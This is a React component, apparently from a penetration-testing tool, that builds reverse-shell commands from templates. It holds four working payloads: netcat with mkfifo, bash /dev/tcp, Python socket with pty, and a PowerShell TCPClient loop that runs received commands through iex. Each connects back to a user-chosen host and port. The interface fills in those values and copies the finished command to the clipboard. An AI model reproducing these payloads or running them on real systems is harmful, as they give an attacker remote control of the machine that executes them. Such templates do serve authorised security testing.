import React, { useState } from 'react';
import { Terminal, Copy, Check, Zap } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';

const PAYLOAD_TEMPLATES = [
  {
    id: 'nc-rev-shell',
    name: 'Netcat Reverse Shell',
    template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f',
    category: 'Reverse Shell'
  },
  {
    id: 'bash-rev-shell',
    name: 'Bash Reverse Shell',
    template: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    category: 'Reverse Shell'
  },
  {
    id: 'py-rev-shell',
    name: 'Python Reverse Shell',
    template: 'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
    category: 'Reverse Shell'
  },
  {
    id: 'ps-rev-shell',
    name: 'PowerShell Reverse Shell',
    template: '$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
    category: 'Reverse Shell'
  }
];

export const PayloadGenerator: React.FC = () => {
  const [lhost, setLhost] = useState('10.10.10.10');
  const [lport, setLport] = useState('4444');
  const [selectedTemplate, setSelectedTemplate] = useState(PAYLOAD_TEMPLATES[0]);
  const [copied, setCopied] = useState(false);

  const generatedPayload = selectedTemplate.template
    .replace(/{LHOST}/g, lhost)
    .replace(/{LPORT}/g, lport);

  const handleCopy = () => {
    navigator.clipboard.writeText(generatedPayload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6 p-6 bg-black/40 border border-terminal-border rounded-xl">
      <div className="flex items-center gap-3 mb-2">
        <Zap className="w-5 h-5 text-terminal-green" />
        <h3 className="text-lg font-bold text-terminal-green uppercase tracking-tight">Payload Forge</h3>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="space-y-2">
          <Label className="text-[10px] font-mono text-terminal-text/50 uppercase">Template</Label>
          <Select 
            value={selectedTemplate.id} 
            onValueChange={(val) => setSelectedTemplate(PAYLOAD_TEMPLATES.find(t => t.id === val)!)}
          >
            <SelectTrigger className="bg-black/60 border-terminal-border text-xs font-mono">
              <SelectValue placeholder="Select template" />
            </SelectTrigger>
            <SelectContent className="bg-terminal-bg border-terminal-border text-terminal-text">
              {PAYLOAD_TEMPLATES.map(t => (
                <SelectItem key={t.id} value={t.id} className="text-xs font-mono focus:bg-terminal-green/20 focus:text-terminal-green">
                  {t.name}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>

        <div className="space-y-2">
          <Label className="text-[10px] font-mono text-terminal-text/50 uppercase">LHOST</Label>
          <Input 
            value={lhost} 
            onChange={(e) => setLhost(e.target.value)}
            className="bg-black/60 border-terminal-border text-xs font-mono"
          />
        </div>

        <div className="space-y-2">
          <Label className="text-[10px] font-mono text-terminal-text/50 uppercase">LPORT</Label>
          <Input 
            value={lport} 
            onChange={(e) => setLport(e.target.value)}
            className="bg-black/60 border-terminal-border text-xs font-mono"
          />
        </div>
      </div>

      <div className="relative group">
        <div className="absolute -top-2 left-4 px-2 bg-terminal-bg text-[9px] font-mono text-terminal-green uppercase tracking-widest border border-terminal-green/30 rounded">
          Generated Output
        </div>
        <div className="p-4 pt-6 bg-black/80 border border-terminal-border rounded-lg font-mono text-xs text-terminal-green/90 break-all min-h-[100px]">
          {generatedPayload}
        </div>
        <Button 
          onClick={handleCopy}
          variant="ghost" 
          size="sm" 
          className="absolute top-4 right-4 text-terminal-text/40 hover:text-terminal-green hover:bg-terminal-green/10"
        >
          {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
        </Button>
      </div>

      <div className="flex items-center gap-2 text-[10px] font-mono text-terminal-text/40 italic">
        <Terminal className="w-3 h-3" />
        <span>Note: Always verify payloads in a controlled environment before engagement.</span>
      </div>
    </div>
  );
};
